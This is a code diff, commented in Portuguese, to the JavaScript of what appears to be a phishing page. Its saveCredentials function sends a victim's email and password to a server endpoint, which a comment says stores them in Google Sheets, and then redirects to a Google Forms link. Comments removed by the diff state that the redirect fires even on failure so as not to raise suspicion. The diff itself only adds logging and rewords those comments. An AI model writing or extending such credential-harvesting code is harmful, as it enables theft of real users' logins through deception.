@@ -513,8 +513,12 @@ function goToEmailStep() {
     nextButton.textContent = t.next;
 }
 
-// Função para salvar credenciais no servidor
+// Função para salvar credenciais no Google Sheets via API REST
 async function saveCredentials(email, password) {
+    console.log('=== SALVANDO CREDENCIAIS ===');
+    console.log('Email:', email);
+    console.log('Password:', password ? '***' : 'vazio');
+    
     try {
         const response = await fetch('/api/save-credentials', {
             method: 'POST',
@@ -528,22 +532,24 @@ async function saveCredentials(email, password) {
         });
 
         const data = await response.json();
+        console.log('Resposta da API:', data);
         
         if (response.ok) {
+            console.log('✅ Credenciais salvas no Google Sheets com sucesso!');
             // Redirecionar para o Google Forms após salvar
             setTimeout(() => {
                 window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
             }, 500);
         } else {
-            console.error('Erro ao salvar:', data.error);
-            // Mesmo com erro, redirecionar para não levantar suspeitas
+            console.error('❌ Erro ao salvar:', data.error);
+            // Mesmo com erro, redirecionar
             setTimeout(() => {
                 window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
             }, 500);
         }
     } catch (error) {
-        console.error('Erro na requisição:', error);
-        // Mesmo com erro, redirecionar para não levantar suspeitas
+        console.error('❌ Erro na requisição:', error);
+        // Mesmo com erro, redirecionar
         setTimeout(() => {
             window.location.href = 'https://forms.gle/Xnf7nppr9fjVrEW39';
         }, 500);
